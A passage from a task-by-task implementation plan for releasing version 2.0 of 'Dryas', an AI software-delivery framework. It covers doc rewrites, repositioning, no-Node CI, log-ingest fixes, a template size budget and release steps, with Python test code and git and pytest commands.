    - `dryas memory` (`claude/bin/dryas`, `dryas.cmd`).
    - **Cut-over** section, verbatim from the spec: run setup for 2.0 with `--judge jev` (shadow `local` is the default when a key is present), run `dryas memory import-ruflo`, accept the legacy cleanup, keep working, and flip to `--judge local` when `/tune` proposes it.
    - Uninstall's legacy cleanup.
    - Remove :88/:101–102/:228/:255's "required dependency" claims.
  - **`docs/harnesses.md`:**
    - Codex now gets the memory tools (`memory_search`, `memory_store`, `memory_list`, `memory_forget`, `swarm_init`) from the `jev` server, plus `mem-session-start`.
    - The remaining Claude-Code-only list replaces "the Ruflo hooks" with "the memory stages other than session start".
    - State conformance exactly as `reference/README.md` will state it in Task 11. If any MEM row is still "not met" on Codex, say "full memory-tool parity", not "full conformance".
  - **`docs/roles.md`:** change only if a role's skill list names a Superpowers skill.
  - **`docs/execution-model.md:55`, `docs/review-model.md:28`:** Dryas skill names; the swarm becomes the `swarm_init` ledger on the Dryas server.
  - **`docs/release-check.md`:** the Ruflo check is "only with the Ruflo extra"; drop the superpowers-dependency line; add the no-Node check (Task 12).
  - **`docs/roadmap.md` Phase 4 (:60–80):** rewrite to the owned-core shape. Sub-projects 0, A1, A2, B, C, D and what each shipped (one line each). Shadow-then-enforce for task-level judgement with A2's finding: `review.task_skip` usually reports "no evidence" because build files are always judged and in-cwd plain edits are already skipped, so the value is in the per-task numbers, the scored start tier and the done-when check. :86 "(off by default, like Ruflo)" becomes "(off by default; Ruflo is now an optional extra)".
  - **`CONTRIBUTING.md`:** Node is needed only to test the optional Ruflo component (`claude/ruflo/tests`), and the core is stdlib Python.
- [ ] **Step 4: Run** Done, including `install/tests/test_tier_docs.py` (tier wording, model names only in backticks).
- [ ] **Step 5: Commit** the Scope paths and `git commit -m "docs: the owned core in workflow, memory, governance, install, harnesses and roadmap"`.

---

## Task 11: Repositioning — README, reference, spec §9.2, GitHub wording

Goal: the repo presents Dryas 2.0 as an owned operating model for AI software delivery with Superpowers, Ruflo and Jev as optional extras or upgrades; the reference manifest and spec §9.2 show the new bindings; conformance is re-stated; the GitHub description and topics are drafted and changed only after Promprit approves the wording.
Scope:
- README.md
- reference/README.md
- reference/dryas.yaml
- spec/dryas-spec-v1.md
- docs/why-dryas.md
- docs/operating-model.md
- docs/adoption-guide.md
- NOTICE.md
- install/tests/test_owned_core_docs.py
Done:
- `python3 -m pytest -q install/tests` passes
- `python3 tools/inventory.py --check` prints `0 problems`
- The GitHub wording draft has been shown to Promprit (orchestrator step; see Step 6)
Failing test first: install/tests/test_owned_core_docs.py :: RepositionTest :: test_readme_scorecard_matches

**Interfaces:**
- Consumes: `tools/judge_score.markdown`, `reference/judge-corpus/SCORECARD.md` (Task 6), Task 10's `DocsTest`.
- Produces: README "Local judge scorecard" section containing SCORECARD.md's table verbatim between `<!-- scorecard:start -->` and `<!-- scorecard:end -->`.

- [ ] **Step 1: Extend the test.** In `install/tests/test_owned_core_docs.py`, change `FILES = DOCS + ["README.md", "reference/README.md", "docs/why-dryas.md", "docs/operating-model.md", "docs/adoption-guide.md"]` and add:

```python
class RepositionTest(unittest.TestCase):
    def test_readme_scorecard_matches(self):
        r = (ROOT / "README.md").read_text(encoding="utf-8")
        block = r.split("<!-- scorecard:start -->")[1].split("<!-- scorecard:end -->")[0]
        card = (ROOT / "reference/judge-corpus/SCORECARD.md").read_text(encoding="utf-8")
        table = card[card.index("| Measure"):]
        self.assertEqual(block.strip(), table.strip())

    def test_readme_positioning(self):
        r = (ROOT / "README.md").read_text(encoding="utf-8")
        self.assertIn("owned operating model", r)
        self.assertNotIn("built on Superpowers, Ruflo", r)
        for flag in ("--with-ruflo", "--with-superpowers", "--judge"):
            self.assertIn(flag, r)

    def test_manifest_bindings(self):
        y = (ROOT / "reference/dryas.yaml").read_text(encoding="utf-8")
        for needle in ("provider: dryas:brainstorm", "provider: dryas", "process: dryas", "judge:"):
            self.assertIn(needle, y)
        self.assertNotIn("superpowers:brainstorming", y)
        s = (ROOT / "spec/dryas-spec-v1.md").read_text(encoding="utf-8")
        ex = s[s.index("9.2"):]
        self.assertNotIn("provider: ruflo\n", ex.split("```")[1] if "```" in ex else ex)
```

  Read `reference/dryas.yaml`'s structure before fixing its needles: the slot names must be the file's own keys, rebound.
- [ ] **Step 2: Run** → FAIL.
- [ ] **Step 3: README.md.**
  - Intro (:10): "Dryas is an owned operating model for AI software delivery: a framework, a draft specification and a reference implementation that runs on its own core (a deterministic local judge, its own memory and process skills) on Claude Code and Codex. Superpowers, Ruflo and the Jev model are optional extras or upgrades."
  - :20 and the "Why not just install the skills?" section: reframe accordingly.
  - Install (:70–106): the fresh install needs Python 3.9+ only. Add the `--judge`, `--with-*` and `--memory` flags and the cut-over pointer to `docs/install.md`. Remove the Superpowers-dependency sentences (:82, :91).
  - "Reference stack" table (:134–141): rows are Claude Code / Codex (required), Dryas core (judge, memory, process skills; always), Jev model (`--judge jev` or `--openrouter-key`), Ruflo (`--with-ruflo`), Superpowers (`--with-superpowers`), Impeccable + UI UX Pro Max (installed by default; `--no-design`) and pstack picks (`--no-pstack-picks`).
  - Requirements (:145–150): drop Node, and note "Node and npm only with `--with-ruflo`".
  - Credits (:152–155): keep both credits, reworded as "process skills derived from" and "optional extra".
  - New section "Local judge scorecard": one sentence on what it measures, then the scorecard markers with SCORECARD.md's table pasted verbatim.
  - Commands: `/retro` is mentioned where commands are listed.
- [ ] **Step 4: Reference and spec.**
  - **`reference/README.md`:**
    - Rows :21 and :26 name Dryas memory and the Dryas skills, with Ruflo and Superpowers as alternatives.
    - Conformance rows :49, :50, :53, :57, :70, :77 and :86 name the Dryas bindings (`dryas:brainstorm`, `memhooks.py`/`memdb.py` for MEM-5, `dryas:worktree`, the `swarm_init` ledger, `dryas:verify`).
    - Re-state each CX cell with the merged code in front of you. MEM rows become "met" on Codex where the `jev` server's memory tools satisfy them. A row that still depends on a Claude-only hook stays "partial" with a note.
  - **`reference/dryas.yaml`:**
    - brainstorm `provider: dryas:brainstorm`; memory `provider: dryas` (comment: `# or ruflo (--memory ruflo) or none`).
    - `hook_order: [scope-lock, gate, memory, observer]`; `parallel: dryas-task-ledger`; `process: dryas` (comment: `# or superpowers`).
    - Add `judge: {provider: local, shadow: none}` (comment: `# jev when a key is set`).
  - **`spec/dryas-spec-v1.md` §9.2 only:** the same bindings in the example manifest. No numbered rule changes. Diff check: `git diff spec/dryas-spec-v1.md` touches only lines inside §9.2's code block.
- [ ] **Step 5: Framework docs.**
  - **`docs/why-dryas.md`:**
    - :5: Claude Code, Codex, the Dryas core, and optional extras.
    - :24: reword its Superpowers/Ruflo mention to match :29's new roles.
    - :29 "One owner per job": the Dryas skills own process, Dryas memory owns memory, Jev owns judgement, the scope lock owns scope.
    - :30: "Scope lock, then gate, then memory, then observer".
  - **`docs/operating-model.md`, `docs/adoption-guide.md`:** grep for `Ruflo` and `Superpowers` and apply the same reframing wherever they are named as a required layer.
  - **`NOTICE.md`:** keep the credits. Add the corpus line: "`reference/judge-corpus/` is original to this repo."
- [ ] **Step 6: GitHub wording (human gate).** Do not run `gh repo edit` in this task. The executor writes the proposed description (≤ 350 chars) and topics (≤ 20, lowercase, hyphenated) into its report. Draft:
  - Description: "Dryas: an owned operating model for AI software delivery — framework, draft spec and a reference implementation with its own judge, memory and process skills for Claude Code and Codex. Jev, Ruflo and Superpowers are optional upgrades."
  - Topics: `ai-software-delivery`, `operating-model`, `claude-code`, `codex`, `agentic-workflow`, `code-review`, `developer-tools`, `llm-governance`.

  The orchestrator shows both to Promprit. Only after explicit approval does it run `gh repo edit promprit/dryas-workflow --description "<approved>" --add-topic <t> …`, and it records the approved text in Task 15's CHANGELOG entry.
- [ ] **Step 7: Run** Done.
- [ ] **Step 8: Commit** the Scope paths and `git commit -m "docs: reposition Dryas 2.0 as an owned operating model; reference bindings and scorecard"`.

---

## Task 12: No-Node install, CI and the end-to-end loop

Goal: `tools/release_check.py` gains a no-Node check; CI runs the test suite and an end-to-end install-and-loop test on macOS, Linux and Windows with no Node, and keeps Ruflo's Node tests in their own job.
Scope:
- tools/release_check.py
- .github/workflows/ci.yml
- .github/workflows/latest-compat.yml
- install/tests/test_e2e_no_node.py
- install/tests/test_release_check.py
Done:
- `python3 -m pytest -q install/tests` passes
- `python3 tools/release_check.py --help` exits 0 (or the script's own no-arg mode reports the new check by name)
Failing test first: install/tests/test_e2e_no_node.py :: NoNodeLoopTest :: test_install_and_loop_without_node

**Interfaces:**
- Consumes: the fake CLIs and setup used by `install/tests/test_e2e_install.py::…::test_both_harnesses_install_hooks_run_and_uninstall` (reuse its helpers by import, do not copy); `release_check.Report.say`, `release_check.sandbox(env, tmp)`.
- Produces: `release_check.no_node(rep, repo, tmp) -> None`, which reports `PASS no-node install` / `FAIL no-node install: <detail>`. `test_e2e_no_node.path_without_node(path: str) -> str` drops PATH entries that contain a `node` or `node.exe` executable.

- [ ] **Step 1: Write the failing test** `install/tests/test_e2e_no_node.py`. It reuses the e2e test's fixtures to:
  1. Build an env with a temp HOME and `PATH = path_without_node(os.environ["PATH"])`, prepending the fake `claude`/`codex` CLIs' dir.
  2. Run `install/install.sh` (POSIX) or `install.ps1` (Windows, `powershell -NoProfile -File`) with `--yes --harness both` and no flags. Assert exit 0 and that the recorded components exclude `ruflo` and `superpowers`.
  3. Run the scripted loop with the mock hook stdin used by the existing tests, through `chain.py`:
     - `prompt` (expect route context or nothing, exit 0);
     - `pretool` for an Edit inside a temp repo with an active `.orchestrate/active.json` scope that includes the file (expect no deny);
     - `pretool` for an Edit outside scope (expect a scope-lock deny);
     - `post` for the allowed Edit (expect an `edits` row in `DRYAS_DB`);
     - `session-end` (expect a `sessions` row with a summary);
     - `pretool` for `git commit -m x` (expect no deny from the local judge).
  4. For Codex: run `chain.py pretool --harness codex` with an `apply_patch` event, and `session-start --harness codex`.
  5. Assert that `shutil.which("node", path=env["PATH"])` is None throughout.

  If the Codex mock Responses server from the Codex plugin spec exists in `install/tests` (grep `Responses`), add one turn through it. If it does not exist, stop at the hook level, and say so in the commit body.
- [ ] **Step 2: Run** → FAIL (or it passes already: then keep it, and still add the release check and CI).
- [ ] **Step 3: `release_check.no_node`.**
  - In a `tempfile.mkdtemp()` HOME with Node stripped from PATH, run `install/dryas_install.py preflight --harness claude --claude-dir <tmp>/.claude`.
  - Expect exit 0 and `preflight ok`.
  - Call it from `main()` after `release_versions(rep)`.
  - Add a `test_release_check.py` case asserting `no_node` says PASS with a fake PATH and FAIL when preflight returns non-zero (mock `subprocess.run`).
- [ ] **Step 4: CI.** In `ci.yml`:
  - Remove `actions/setup-node` and the `node …test_ns.cjs` step from job `test`.
  - Add `install/tests/test_e2e_no_node.py` (it is already in `install/tests`).
  - Change the pytest line to `python -m pytest -q -rs claude/jev/tests install/tests`.
  - Add a job `ruflo-extra` on `ubuntu-latest` with Python 3.12 and Node 20 that runs `python -m pytest -q -rs claude/ruflo/tests` and `node claude/ruflo/tests/test_ns.cjs`.

  In `latest-compat.yml`, the pytest line runs `claude/ruflo/tests install/tests/test_ruflo*` only if such files exist; otherwise keep its line and add `--with-ruflo` where it calls the installer. Keep the job's Ruflo steps.

  GitHub's hosted runners ship Node preinstalled, so the job must not rely on "Node is absent". The e2e test strips Node from PATH itself, and that test is the proof.
- [ ] **Step 5: Run** Done locally.
- [ ] **Step 6: Commit** the Scope paths and `git commit -m "ci: no-Node install and end-to-end loop on three OSes; Ruflo tests in their own job"`.

---

## Task 13 (FlowObserve repo): golden replay of the 2.0 records

Goal: FlowObserve recognises the plugin-prefixed Jev tool names and the new record fields and files without miscounting; a golden fixture of a 2.0 session passes before D merges.
Repo and worktree: the FlowObserve repo (`../flowobserve` beside this repo), branch `feat/dryas-2-records` in its own worktree (one session per project folder: if another session owns FlowObserve, send it this task instead of running it here).
Scope:
- server/src/ingest.ts
- server/src/jev.ts
- server/test/**
- fixtures/golden/2026-10-15-dryas-2.jsonl
- fixtures/golden/2026-10-15-dryas-2.expected.json
Done:
- `pnpm --filter @fo/server test` passes (TZ handled by the script)
- `node scripts/pytest.mjs` passes
Failing test first: server/test/golden.test.ts :: replays 2026-10-15-dryas-2

**Interfaces:**
- Consumes the 2.0 records:
  - `gate.jsonl` with `provider`, `local_ms`, `reasons`, `shadow_provider`, `shadow_decision`, `task_id`, `rel`, `tool_use_id`;
  - `dispatch.jsonl` with a `phase: "return"` record (`tokens`, `duration_ms`, `agent_id`, `lines`) after each dispatch record;
  - new files `memory.jsonl` and `outcomes.jsonl`;
  - hook-spool tool names `mcp__plugin_dryas_jev__{jev_judge,log_dispatch,log_escalation,log_review,memory_search,memory_store,swarm_init}`.
- Produces: `ingest.ts` matches both `mcp__jev__X` and `mcp__plugin_dryas_jev__X`; dispatch counts ignore `phase` records; `memory.jsonl` and `outcomes.jsonl` lines are ignored (not misread as overrides or gate lines).

- [ ] **Step 1:** Create the fixture from a real 2.0 session spool if one exists (`~/.flowobserve` spool after running Tasks 1–8 locally). Otherwise hand-write about 20 spool lines in the shape of `2026-10-07-mixed.jsonl`, using the plugin-prefixed names (two `log_dispatch` calls, one `memory_search`, one `swarm_init`, one `log_escalation`). Write the expected file with `GOLDEN_UPDATE=1` **only after** the code change. First, write the expected counts by hand in the test (2 dispatches, 1 escalation) so the test fails today.
- [ ] **Step 2:** Run → FAIL (plugin-prefixed names are not recognised: the mismatch found while planning, at `server/src/ingest.ts:104-128`).
- [ ] **Step 3:** In `ingest.ts`, normalise the tool name: strip the `mcp__plugin_dryas_jev__` prefix to `mcp__jev__` before matching. In `jev.ts`, make `parseJevLine` skip lines from `memory.jsonl` and `outcomes.jsonl` by file name, and skip dispatch records with `phase`. Add unit tests for each in `server/test/`.
- [ ] **Step 4:** `GOLDEN_UPDATE=1` for the new fixture only. Review the expected JSON by hand and run Done.
- [ ] **Step 5:** Commit in the FlowObserve repo: `git commit -m "feat: Dryas 2.0 records — plugin-prefixed Jev tools, return-phase dispatches, memory and outcome logs"`. Report the commit to the orchestrator. Merging it is FlowObserve's owner's step, and it must land before Task 15.

---

## Task 14: Rules-template pass

Goal: rewrite `claude/CLAUDE.md.template` and `codex/AGENTS.md.template` with C's writing rules (front-loaded pointers, checkable bounds, positive instructions with "never" kept for hard guardrails, one source of truth, no-op lines deleted); measure before and after; budget each at its rewritten size plus 10%; prove every rule is still reachable with a coverage table.
Scope:
- claude/CLAUDE.md.template
- codex/AGENTS.md.template
- docs/template-coverage.md
- install/tests/fixtures/template-pre-2.0/**
- install/tests/test_template_budget.py
- install/tests/test_claude_md_template.py
Done:
- `python3 -m pytest -q install/tests claude/jev/tests/test_rules_inject.py` passes
- `python3 tools/inventory.py --check` prints `0 problems`
Failing test first: install/tests/test_template_budget.py :: BudgetTest :: test_every_pre_rule_is_covered

**Interfaces:**
- Consumes: C's writing rules (read `claude/skills/plan/SKILL.md` and `claude/skills/UPSTREAM.md` for the wording rules C adopted), the templates as Task 5 left them.
- Produces: `docs/template-coverage.md` with one table per template, `| Rule (pre-2.0 line) | Where now |`, where "Where now" is `template` (the line, possibly reworded) or `pointer: <path>#<heading>`. `install/tests/test_template_budget.py` pins: rewritten size ≤ `BUDGET` per edition (the measured rewritten bytes × 1.10, rounded down, written as literals), every non-blank, non-heading line of the pre-2.0 fixture has a coverage row, and every `pointer:` target file exists and contains the heading.

- [ ] **Step 1: Freeze the before state.** Copy both templates as they are now (after Task 5) to `install/tests/fixtures/template-pre-2.0/`, and record their byte sizes: `wc -c claude/CLAUDE.md.template codex/AGENTS.md.template`. The spec's figures (3,909 and 2,402) are from before C. Use today's measurement as "before" and put both numbers in the commit body.
- [ ] **Step 2: Write the failing test** `install/tests/test_template_budget.py`:

```python
import re
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
PRE = ROOT / "install/tests/fixtures/template-pre-2.0"
PAIRS = (("claude/CLAUDE.md.template", "CLAUDE.md.template"), ("codex/AGENTS.md.template", "AGENTS.md.template"))
BUDGET = {"claude/CLAUDE.md.template": 0, "codex/AGENTS.md.template": 0}  # set in Step 4 from the measured sizes


def rows(text, title):
    sect = text.split("## " + title)[1].split("\n## ")[0]
    out = {}
    for line in sect.splitlines():
        m = re.match(r"^\| (.+?) \| (.+?) \|$", line)
        if m and not m.group(1).startswith(("Rule", "---")):
            out[m.group(1).strip()] = m.group(2).strip()
    return out


class BudgetTest(unittest.TestCase):
    def test_sizes_within_budget(self):
        for p, _ in PAIRS:
            self.assertGreater(BUDGET[p], 0, "budget not set")
            self.assertLessEqual(len((ROOT / p).read_bytes()), BUDGET[p], p)

    def test_every_pre_rule_is_covered(self):
        cov = (ROOT / "docs/template-coverage.md").read_text(encoding="utf-8")
        for p, fx in PAIRS:
            table = rows(cov, p)
            for line in (PRE / fx).read_text(encoding="utf-8").splitlines():
                key = line.strip().lstrip("- ").strip()
                if not key or key.startswith("#") or key.startswith("<!--"):
                    continue
                self.assertIn(key[:60], {k[:60] for k in table}, "%s: no coverage row for %r" % (p, key[:60]))
            for target in table.values():
                if target.startswith("pointer: "):
                    path, _, head = target[len("pointer: "):].partition("#")
                    t = (ROOT / path).read_text(encoding="utf-8")
                    self.assertIn(head.replace("-", " ").lower(), t.lower(), target)
```

- [ ] **Step 3: Run** → FAIL (no coverage doc, budget 0).
- [ ] **Step 4: Rewrite.** Apply C's rules line by line.
  - Lines that restate a skill become a pointer (`Brainstorm first: dryas:brainstorm`).
  - Bounds become numbers.
  - Instructions are positive; "never" stays only for hard guardrails (the asks before install/move/delete/overwrite, `.orchestrate/` never committed, one agent per worktree).
  - Delete lines that change nothing.

  Keep every needle that `test_claude_md_template.py`, `test_codex_templates.py`, `test_process_wiring.py`, `test_codex_process_wiring.py` and Task 5's wiring test require. Those tests are the floor. Write `docs/template-coverage.md` with one `## claude/CLAUDE.md.template` and one `## codex/AGENTS.md.template` table covering every pre-2.0 line. Measure the new sizes and set `BUDGET` to `int(size * 1.10)`.
- [ ] **Step 5: Named exception.** `test_claude_md_template.py`'s `< 5 * 1024` bound stays. Only if a required needle's wording changed during the rewrite, update that one needle, and name it in the commit body.
- [ ] **Step 6: Run** Done (`test_rules_inject.py` keeps its 10,000 / 8,000 limits).
- [ ] **Step 7: Commit** the Scope paths. The commit message is `refactor(templates): measured rules pass with a coverage table and a size budget`, and its body gives the before → after bytes for each edition.

---

## Task 15: Release 2.0.0

Goal: confirm every "Before 2.0 ships" item, bump to 2.0.0 everywhere, write the CHANGELOG, and run the full verification on the merged line.
Scope:
- claude/.claude-plugin/plugin.json
- codex/.codex-plugin/plugin.json
- .claude-plugin/marketplace.json
- claude/jev/jev_mcp.py
- codex/jev/**
- CHANGELOG.md
- install/tests/test_release_2_0.py
Done:
- `python3 -m pytest -q -rs claude/jev/tests install/tests` passes; `python3 -m pytest -q claude/ruflo/tests` passes (Node present locally)
- `python3 tools/sync_codex_plugin.py --check` exits 0; `python3 tools/inventory.py --check` prints `0 problems`; `python3 tools/judge_score.py --check` exits 0
- `python3 tools/release_check.py` reports no FAIL on this Mac (both config dirs if two accounts are set up)
- `git rev-list --count feat/owned-core-d..origin/main` prints `0`
- FlowObserve's Task 13 commit is merged in its repo
Failing test first: install/tests/test_release_2_0.py :: ReleaseTest :: test_versions_are_2_0_0

**Interfaces:**
- Consumes: `release_check.VERSION_FILES`, `release_check.version_problems`.
- Produces: version `2.0.0` in all five version files; `CHANGELOG.md` `## 2.0.0 - <date>` with `### Added`, `### Changed`, `### Kept (optional extras)`, `### Upgrade` sections.

- [ ] **Step 1: Write the failing test** `install/tests/test_release_2_0.py`:

```python
import json
import re
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "tools"))
import release_check


class ReleaseTest(unittest.TestCase):
    def test_versions_are_2_0_0(self):
        self.assertEqual(json.loads((ROOT / "claude/.claude-plugin/plugin.json").read_text())["version"], "2.0.0")
        self.assertEqual(release_check.version_problems(ROOT), [])  # all five agree

    def test_changelog_2_0_0(self):
        c = (ROOT / "CHANGELOG.md").read_text(encoding="utf-8")
        top = c.split("\n## ")[1]
        self.assertTrue(top.startswith("2.0.0 - "))
        for s in ("### Added", "### Changed", "### Kept (optional extras)", "### Upgrade"):
            self.assertIn(s, top)
        for n in ("dryas memory import-ruflo", "--judge", "--with-ruflo", "/retro"):
            self.assertIn(n, top)

    def test_before_2_0_items(self):
        e = (ROOT / "claude/agents/executor.md").read_text(encoding="utf-8")
        self.assertIn("Commit your own task only when the dispatch prompt allows it", e)
        self.assertNotIn("docs/governance.md", (ROOT / "claude/skills/review-receive/SKILL.md").read_text())
        for f in ("claude/jev/tests/test_local_judge_parity.py", "claude/jev/tests/test_redact.py",
                  "claude/jev/tests/test_local_judge_heredoc.py"):
            t = (ROOT / f).read_text(encoding="utf-8")
            self.assertTrue(re.search(r"median|baseline|relative", t), f + ": timing budget is still absolute")
```

  Read `version_problems`' signature first and match its argument.
- [ ] **Step 2: Run** → FAIL.
- [ ] **Step 3: Versions.** Set `2.0.0` in the five files (`serverInfo.version` in `claude/jev/jev_mcp.py`), then run the sync so `codex/jev/jev_mcp.py` follows. `reference/inventory-1.x.json` stays at `1.0.2`: it is the 1.x snapshot, and `test_inventory.py` pins it.
- [ ] **Step 4: CHANGELOG.** Add `## 2.0.0 - <today>` above 1.0.2:
  - **Added:** the local judge and providers (A1); task-level judgement in shadow (A2); Dryas memory and its tools (B); eight Dryas process skills (C); memory stages; background consolidation; `dryas memory`; installer flags; the judge scorecard; `/tune` judge disagreements, allowlist proposals, lines per task and memory counts; `/retro`; `GLOSSARY.md`; `.out-of-scope/`; the no-Node CI.
  - **Changed:** fresh-install defaults; executor rule 5; the templates (with the measured sizes); the docs and repositioning; `--no-jev` means `--judge local`.
  - **Kept (optional extras):** Ruflo (`--with-ruflo`, `--memory ruflo`), Superpowers (`--with-superpowers`), the design plugins (default), the Jev model (`--judge jev`).
  - **Upgrade:** the cut-over steps from `docs/install.md`.

  If Task 11's GitHub wording was approved and applied, add one line under Changed with the new description.
- [ ] **Step 5: Before-2.0 confirmation.**
  - Item 1 (executor rule) and item 2 (pointer) are pinned by the test.
  - For item 3 (timing tests, fixed by A2's cleanup): run `for i in 1 2 3 4 5; do python3 -m pytest -q claude/jev/tests/test_local_judge_parity.py claude/jev/tests/test_redact.py claude/jev/tests/test_local_judge_heredoc.py || break; done` while the full suite runs in parallel (`python3 -m pytest -q claude/jev/tests install/tests &`). All 5 must pass. If one fails, stop: the release waits for a fix task, so report it.
  - Item 4 (stale docs) is pinned by Task 10/11's `DocsTest`.
- [ ] **Step 6: Full verification** (dryas:verify): everything in Done, run fresh, with output read. Answer `claude/pstack/benchmark-checklist.md` before quoting any timing.
- [ ] **Step 7: Commit** `git add` the version files, `CHANGELOG.md`, `install/tests/test_release_2_0.py` and `codex/jev`, then `git commit -m "chore(release): Dryas 2.0.0"`. Tagging, merging `spec/owned-core` → `main`, and pushing `main` happen only when Promprit says release.

---

## Handoff notes for executors (facts gathered while planning, 2026-10-15)

- **Stale-claim locations** (spec/owned-core at c33f7bb):
  - `README.md` :10, :20, :82, :91, :138–139, :150, :154–155
  - `reference/README.md` :21, :26, :49, :50, :53, :57, :70, :77, :86
  - `reference/dryas.yaml` :10, :16, :28, :39, :40
  - `spec/dryas-spec-v1.md` §9.2 from :119 (`provider: ruflo` at :134)
  - `docs/workflow.md` :15, :35–36, :66, :77, :79, :102, :106, :111, :137–153, :171, §7 :204–218, §8 :220–231, :258–303
  - `docs/why-dryas.md` :5, :24, :29, :30
  - `docs/architecture.md` :23; `docs/execution-model.md` :55; `docs/review-model.md` :28; `docs/memory-model.md` :34
  - `docs/harnesses.md` :18, :20, :31; `docs/roadmap.md` :60–86
  - `docs/release-check.md` :25, :29
  - `docs/install.md` :18–19, :71, :87–88, :92, :101–102, :110, :123, :136, :148, :154, :219–228, :255–259
  - `CONTRIBUTING.md` :5, :25–26
  - `claude/CLAUDE.md.template` :10–11; `codex/AGENTS.md.template` :20, :23, :28
  - `claude/skills/orchestrate/SKILL.md` :3, :4, :10, :22, :65, :82; `codex/skills/orchestrate/SKILL.md` :3, :11, :28
  - `claude/commands/tune.md` :7
- **Hooks today:** PostToolUse, SubagentStop and SessionEnd are wired only by the Ruflo settings-fragment block. Plugin `hooks.json` has PreToolUse, UserPromptSubmit, SessionStart and PreCompact. `memhooks.py` is not wired anywhere before Task 1.
- **Installer:** the real parser is `install/run_cmd.py parse()`. Flags are passed through by `install.sh`/`install.ps1` → `dryas_install.py run`. `chain.py` reads only `enabled`/`timeout` from `chain.local.json`. The `"off"` list is read by `rules_inject.py`.
- **`gate.jsonl` shadow fields** are `shadow_provider`, `shadow_decision`, `shadow_p_safe`, `shadow_risk`, `shadow_reasons`, `shadow_cost` and `shadow_error`. The spec's `shadow_answer` is `shadow_decision` in code.
- **FlowObserve:** the reducer is `server/src/reducer.ts`; golden tests are `server/test/golden.test.ts` with fixtures in `fixtures/golden/`. It matched only bare `mcp__jev__*` names (`server/src/ingest.ts:104-128`) when this plan was written.
- **A2** (from its session, 2026-10-15):
  - `log_dispatch` writes two records per dispatch (dispatch-time, then `phase: "return"` with tokens, duration_ms and agent_id).
  - New modules: `pathclass.py`, `task_review.py`, `task_score.py`, `tune_tasks.py`, `tune_window.py`, possibly `local_git.py`.
  - All switches are off by default.
  - Codex workers carry no identity, so `task_skip` is never enforced for them.
  - A2's cleanup made the three timing tests (parity, heredoc, redact) take the median of 3 runs against a 40x same-length benign baseline in the same child, with a strict 2 s hang check; 5/5 passed at load ~43. Known residual risk: the `$(` x30000 parity case under extreme load. If it alone fails in Task 15 Step 5, report it with the load average instead of loosening the budget. `local_git.py` has no dedicated test file (covered by existing tests).
  - A2 as merged (25529e6): `task_review.rels(root, tool, ti, cwd="", cap=16)`; gate records with a task verdict carry `rel`; `tune_window.check(task_rows, until, review=None, gate=...)` prints six Done-when lines; the scored-tier ON proposal needs helps >= 2 x hurts and helps >= 1; `docs/governance.md` already states the evidence rules (Task 10 extends, does not restate). Suite at 25529e6: 1621 passed, 2 skipped, 1 known Mac-only Ruflo e2e failure.
  - Removed by A2's cleanup (do not use): `gate._sensitive` (use `pathclass.sensitive`), `taskctx._root` (use `taskctx.root`), `tune_tasks._attempt` (now `tune_tasks.as_int`); `FILE_TOOLS` lives only in `pathclass.py`.
  - A2's cleanup moved the git rules out of `local_judge.py` into `claude/jev/local_git.py`; `local_judge` keeps its public API (`gate_answers`). Tasks 6 and 7 call `local_judge.danger`/`destructive`: if those moved too, import them from where the merged code exposes them.

## Self-review (done while writing)

- **Spec coverage, Sub-project D:**
  - Hook chain: memory stages, provider-agnostic gate and route, the optional `ruflo-pre-bash` stage, GOV-11 order, observe-only within 2 s → Tasks 1, 3.
  - MCP server keeps its name and tools, memory tools added → done in B, confirmed and documented in Tasks 5 and 10.
  - Codex `[mcp_servers.ruflo]` only with Ruflo → Task 3, Step 6.
  - Installer flags, aliases and preflight → Task 3. `components.json` keeps the extras. `dryas.yaml` and §9.2 → Task 11. `write_chain_local` providers, upgrade keeps → Task 3. Uninstall legacy cleanup → Task 4.
  - Docs list → Tasks 10, 11. `~/.dryas/docs/dryas-workflow.md` regenerates from the repo at setup (unchanged mechanism).
  - Repositioning, including the GitHub gate → Task 11.
  - Local judge for keyless users:
    - (1) shadow disagreements → Task 7 (corpus candidates; the rule change itself is the follow-up the tune text prescribes);
    - (2) public scorecard with a CI gate and README numbers → Tasks 6, 11;
    - (3) per-user allowlist proposals, `/tune apply`, always-judged never allowlisted → Task 7 (Bash danger and destructive classes; edit classes are not allowlist-addressable, since `gate.allowlist` is Bash prefixes).
  - Plain-language docs about keyless use → Task 10 (governance).
  - Consolidation outside the hook budget → Task 2.
  - Before 2.0 ships, items 1–4 → Tasks 5, 5, 15 (confirm A2), 10/11.
  - No-loss inventory check on every task → Global Constraints.
  - `/retro`, `GLOSSARY.md`, `.out-of-scope/` → Task 9. Rules-template pass, measured, +10%, coverage → Task 14.
  - Release, no-Node check and CI on three OSes → Tasks 12, 15. Cut-over → Task 10 (`install.md`), Task 15 (CHANGELOG).
  - Testing: FlowObserve golden replay → Task 13. End to end without Node → Task 12. Migration test → done in B.
  - Lines-per-task metric (Ponytail, recorded for D) → Task 8.
- **Placeholders:** two places tell the executor to read a name before using it.
  - The thresholds env var in Task 3's `JudgeFlagTest`.
  - A2's merged names in Task 8.
  These are verification instructions against code that changes before D starts, not missing design. The GitHub description is a draft by design (human gate).
- **Type consistency:**
  - `OBSERVE_KINDS` and stage names match between Tasks 1, 3 and 7.
  - `select`/`providers` return shapes match their tests.
  - `consolidate_bg` names match between memhooks, memcli and the tests.
  - `tune_judge` function names match Task 7's tests and `tune.py` wiring.
  - `lines` (int) flows `log_dispatch` → `_row` → `summary` → `lines()` → FlowObserve fixture.
- **Review Focus:** each of the five lines has a pinning test in its owning task (3, 2, 3, 7, 1).
